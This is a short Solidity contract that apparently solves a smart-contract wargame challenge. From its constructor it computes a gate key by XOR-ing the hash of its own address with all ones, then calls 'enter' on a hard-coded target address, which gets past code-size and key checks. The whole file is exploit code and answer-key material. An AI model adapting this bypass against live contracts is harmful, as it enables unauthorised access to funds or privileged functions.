// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.0;

contract GateTwo {
    address externalContract = 0x9712de03126EE787E4701Cf8a7Dc407851B4A509;

    constructor() {
        bytes8 shift = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                0xffffffffffffffff
        );
        externalContract.call(abi.encodeWithSignature("enter(bytes8)", shift));
    }
}
